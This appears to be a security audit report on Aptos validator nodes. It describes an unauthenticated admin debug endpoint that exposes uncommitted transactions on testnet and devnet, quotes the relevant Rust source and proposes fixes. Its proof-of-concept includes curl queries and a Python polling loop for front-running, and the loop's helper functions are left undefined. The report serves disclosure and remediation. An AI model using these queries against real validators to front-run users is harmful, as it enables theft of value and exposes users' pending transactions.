# Audit Report

## Title
Unauthenticated QuorumStore Database Endpoint Exposes Uncommitted Mempool Transactions on Non-Mainnet Networks

## Summary
The `/debug/consensus/quorumstoredb` admin service endpoint exposes full transaction details from the QuorumStore database before they are committed to the blockchain. On testnet and devnet, this endpoint is enabled by default without authentication, allowing any network participant to query uncommitted transactions and extract MEV (Maximal Extractable Value) through front-running attacks.

## Finding Description

The admin service provides a debug endpoint at `/debug/consensus/quorumstoredb` that dumps the contents of the QuorumStore database. This database stores transaction batches that have been pulled from the mempool but **not yet committed** to the blockchain. [1](#0-0) 

When queried with a batch digest parameter, the endpoint retrieves and returns the full `PersistedValue<BatchInfo>` structure: [2](#0-1) 

The `PersistedValue` structure contains an optional payload field with the full transaction details: [3](#0-2) 

This payload includes complete `SignedTransaction` objects that expose via Debug formatting: [4](#0-3) 

The `RawTransaction` within each `SignedTransaction` contains all transaction details including sender address, sequence number, payload (entry function calls with arguments), gas price, and expiration timestamp: [5](#0-4) 

**Authentication Bypass on Non-Mainnet:**

The admin service has weak authentication controls on non-mainnet networks: [6](#0-5) 

On testnet/devnet, the admin service is enabled by default. When `authentication_configs` is empty (the default), all requests are authenticated without any credential checks: [7](#0-6) 

**Transaction Flow Timeline:**

1. BatchGenerator pulls transactions from mempool
2. Transactions are persisted to QuorumStore DB via `save_batch`: [8](#0-7) 

3. Batches are broadcast to validators for consensus
4. **[VULNERABILITY WINDOW]** Transactions are visible via the debug endpoint
5. Eventually, transactions are committed to blocks

During the vulnerability window (step 4), uncommitted transactions remain in the QuorumStore database and can be queried by any attacker.

## Impact Explanation

This vulnerability enables **High severity** attacks per the Aptos bug bounty criteria ("Significant protocol violations"):

**Front-Running Attacks:**
- Attacker monitors batch digests through network observation or enumeration
- Queries the endpoint to extract transaction details before commitment
- Submits competing transactions with higher gas prices to front-run profitable operations
- Examples: DEX arbitrage, NFT sniping, liquidations

**MEV Extraction:**
- Attackers gain unfair advantage by seeing pending transactions
- Can identify and exploit arbitrage opportunities before other users
- Violates fair ordering assumptions of the mempool

**Censorship Preview:**
- Malicious validators can selectively view and exclude specific transactions
- Enables targeted censorship based on transaction content

**Information Leakage:**
- Exposes user transaction patterns and strategies
- Reveals wallet addresses and their intended operations
- Breaks privacy assumptions of pending transactions

While the vulnerability is **mitigated on mainnet** through disabled admin service by default, it remains **fully exploitable on testnet and devnet** where real value testing and development occurs.

## Likelihood Explanation

**Very High Likelihood on Non-Mainnet:**
- Admin service is enabled by default on testnet/devnet
- No authentication required (empty `authentication_configs`)
- Endpoint is readily accessible via standard HTTP requests
- Attacker needs no special privileges or validator access
- Batch digests can be obtained through:
  - Network traffic monitoring
  - Enumeration of common hash values
  - Observation of consensus messages

**Low Likelihood on Mainnet:**
- Admin service is disabled by default
- If manually enabled, requires authentication

However, the risk exists that operators may enable the admin service on mainnet without proper authentication for debugging purposes.

## Recommendation

**Immediate Mitigations:**

1. **Remove Transaction Payload from Debug Output**: Modify the dump function to exclude the `maybe_payload` field:

```rust
fn dump_quorum_store_db(
    quorum_store_db: &dyn QuorumStoreStorage,
    digest: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();
    
    if let Some(digest) = digest {
        body.push_str(&format!("{digest:?}:\n"));
        // Only show batch metadata, not transaction payload
        if let Ok(Some(batch)) = quorum_store_db.get_batch(&digest) {
            body.push_str(&format!("Batch Info: {:?}\n", batch.batch_info()));
            body.push_str(&format!("Has Payload: {}\n", batch.payload().is_some()));
            // DO NOT include: body.push_str(&format!("{:?}", batch));
        }
    } else {
        for (digest, batch) in quorum_store_db.get_all_batches()? {
            body.push_str(&format!("{digest:?}: metadata only\n"));
        }
    }
    
    Ok(body)
}
```

2. **Enforce Authentication on All Networks**: Modify the config optimizer to require authentication even on testnet: [9](#0-8) 

Add additional validation to prevent empty authentication configs on any enabled admin service.

3. **Consider Removing the Endpoint Entirely**: This debug endpoint provides limited operational value compared to its security risk. Consider removing it or restricting it to local-only access (bind to 127.0.0.1).

## Proof of Concept

**Step 1: Query the endpoint on testnet without authentication**

```bash
# Assuming testnet validator node at testnet-validator.example.com:9102
curl "http://testnet-validator.example.com:9102/debug/consensus/quorumstoredb"
# Returns list of batch digests

# Output example:
# 0x1234abcd...:\n
# 0x5678ef90...:\n
```

**Step 2: Query specific batch with digest**

```bash
curl "http://testnet-validator.example.com:9102/debug/consensus/quorumstoredb?digest=0x1234abcd..."

# Output includes full transaction details:
# Some(PersistedValue { 
#   info: BatchInfo { ... }, 
#   maybe_payload: Some([
#     SignedTransaction { 
#       raw_txn: RawTransaction {
#         sender: 0xALICE_ADDRESS,
#         sequence_number: 42,
#         payload: EntryFunction(0x1::coin::transfer<0x1::aptos_coin::AptosCoin>(
#           0xBOB_ADDRESS,
#           1000000000  // 10 APT
#         )),
#         gas_unit_price: 100,
#         max_gas_amount: 200000,
#         ...
#       },
#       authenticator: ...
#     }
#   ])
# })
```

**Step 3: Exploit for front-running**

```python
import requests
import time

# Monitor endpoint continuously
validator_url = "http://testnet-validator.example.com:9102"

while True:
    # Get all batch digests
    resp = requests.get(f"{validator_url}/debug/consensus/quorumstoredb")
    digests = extract_digests(resp.text)
    
    for digest in digests:
        # Query each batch
        batch_resp = requests.get(
            f"{validator_url}/debug/consensus/quorumstoredb?digest={digest}"
        )
        
        # Parse transaction details
        transactions = parse_transactions(batch_resp.text)
        
        for txn in transactions:
            if is_profitable_to_frontrun(txn):
                # Submit competing transaction with higher gas
                frontrun_transaction(txn)
    
    time.sleep(0.1)  # Poll every 100ms
```

**Testing on Local Network:**

Deploy a local testnet node with default admin service configuration and verify:
1. Admin service binds to 0.0.0.0:9102
2. No authentication required for requests
3. Full transaction payloads are returned in Debug format
4. Transactions visible before block commitment

## Notes

**Mainnet Protection**: The vulnerability is mitigated on mainnet by default because the admin service is disabled. However, there is still risk if:
- Operators manually enable the service without authentication for debugging
- Configuration errors occur during deployment

**Non-Mainnet Impact**: While testnet/devnet have lower financial stakes, they are critical for:
- Protocol testing with real economic incentives
- Developer application testing
- Security researcher analysis

Exposing uncommitted transactions undermines the testing environment's integrity and creates unfair advantages.

**Alternative Endpoints**: The `/debug/consensus/block` endpoint has similar issues and should be reviewed: [10](#0-9)

### Citations

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-174)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
            for authentication_config in &context.config.authentication_configs {
                match authentication_config {
                    AuthenticationConfig::PasscodeSha256(passcode_sha256) => {
                        let query = req.uri().query().unwrap_or("");
                        let query_pairs: HashMap<_, _> =
                            url::form_urlencoded::parse(query.as_bytes()).collect();
                        let passcode: Option<String> =
                            query_pairs.get("passcode").map(|p| p.to_string());
                        if let Some(passcode) = passcode {
                            if sha256::digest(passcode) == *passcode_sha256 {
                                authenticated = true;
                            }
                        }
                    },
                }
            }
        };
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L205-214)
```rust
            (hyper::Method::GET, "/debug/consensus/quorumstoredb") => {
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(quorum_store_db) = quorum_store_db {
                    consensus::handle_dump_quorum_store_db_request(req, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Quorum store db is not available.",
                    ))
                }
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L216-228)
```rust
            (hyper::Method::GET, "/debug/consensus/block") => {
                let consensus_db = context.consensus_db.read().clone();
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(consensus_db) = consensus_db
                    && let Some(quorum_store_db) = quorum_store_db
                {
                    consensus::handle_dump_block_request(req, consensus_db, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db and/or quorum store db is not available.",
                    ))
                }
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L158-177)
```rust
fn dump_quorum_store_db(
    quorum_store_db: &dyn QuorumStoreStorage,
    digest: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    if let Some(digest) = digest {
        body.push_str(&format!("{digest:?}:\n"));
        body.push_str(&format!(
            "{:?}",
            quorum_store_db.get_batch(&digest).map_err(Error::msg)?
        ));
    } else {
        for (digest, _batch) in quorum_store_db.get_all_batches()? {
            body.push_str(&format!("{digest:?}:\n"));
        }
    }

    Ok(body)
}
```

**File:** consensus/src/quorum_store/types.rs (L21-25)
```rust
#[derive(Clone, Eq, Deserialize, Serialize, PartialEq, Debug)]
pub struct PersistedValue<T> {
    info: T,
    maybe_payload: Option<Vec<SignedTransaction>>,
}
```

**File:** types/src/transaction/mod.rs (L179-205)
```rust
pub struct RawTransaction {
    /// Sender's address.
    sender: AccountAddress,

    /// Sequence number of this transaction. This must match the sequence number
    /// stored in the sender's account at the time the transaction executes.
    sequence_number: u64,

    /// The transaction payload, e.g., a script to execute.
    payload: TransactionPayload,

    /// Maximal total gas to spend for this transaction.
    max_gas_amount: u64,

    /// Price to be paid per gas unit.
    gas_unit_price: u64,

    /// Expiration timestamp for this transaction, represented
    /// as seconds from the Unix Epoch. If the current blockchain timestamp
    /// is greater than or equal to this time, then the transaction has
    /// expired and will be discarded. This can be set to a large value far
    /// in the future to indicate that a transaction does not expire.
    expiration_timestamp_secs: u64,

    /// Chain ID of the Aptos network this transaction is intended for.
    chain_id: ChainId,
}
```

**File:** types/src/transaction/mod.rs (L1092-1103)
```rust
impl Debug for SignedTransaction {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(
            f,
            "SignedTransaction {{ \n \
             {{ raw_txn: {:#?}, \n \
             authenticator: {:#?}, \n \
             }} \n \
             }}",
            self.raw_txn, self.authenticator
        )
    }
```

**File:** config/src/config/admin_service_config.rs (L59-82)
```rust
impl ConfigSanitizer for AdminServiceConfig {
    fn sanitize(
        node_config: &NodeConfig,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();

        if node_config.admin_service.enabled == Some(true) {
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
            }
        }

        Ok(())
    }
}
```

**File:** config/src/config/admin_service_config.rs (L84-107)
```rust
impl ConfigOptimizer for AdminServiceConfig {
    fn optimize(
        node_config: &mut NodeConfig,
        _local_config_yaml: &Value,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<bool, Error> {
        let mut modified_config = false;

        if node_config.admin_service.enabled.is_none() {
            // Only enable the admin service if the chain is not mainnet
            let admin_service_enabled = if let Some(chain_id) = chain_id {
                !chain_id.is_mainnet()
            } else {
                false // We cannot determine the chain ID, so we disable the admin service
            };
            node_config.admin_service.enabled = Some(admin_service_enabled);

            modified_config = true; // The config was modified
        }

        Ok(modified_config)
    }
}
```

**File:** consensus/src/quorum_store/batch_store.rs (L488-528)
```rust
    fn persist_inner(
        &self,
        batch_info: BatchInfoExt,
        persist_request: PersistedValue<BatchInfoExt>,
    ) -> Option<SignedBatchInfo<BatchInfoExt>> {
        assert!(
            &batch_info == persist_request.batch_info(),
            "Provided batch info doesn't match persist request batch info"
        );
        match self.save(&persist_request) {
            Ok(needs_db) => {
                trace!("QS: sign digest {}", persist_request.digest());
                if needs_db {
                    if !batch_info.is_v2() {
                        let persist_request =
                            persist_request.try_into().expect("Must be a V1 batch");
                        #[allow(clippy::unwrap_in_result)]
                        self.db
                            .save_batch(persist_request)
                            .expect("Could not write to DB");
                    } else {
                        #[allow(clippy::unwrap_in_result)]
                        self.db
                            .save_batch_v2(persist_request)
                            .expect("Could not write to DB")
                    }
                }
                if !batch_info.is_v2() {
                    self.generate_signed_batch_info(batch_info.info().clone())
                        .ok()
                        .map(|inner| inner.into())
                } else {
                    self.generate_signed_batch_info(batch_info).ok()
                }
            },
            Err(e) => {
                debug!("QS: failed to store to cache {:?}", e);
                None
            },
        }
    }
```
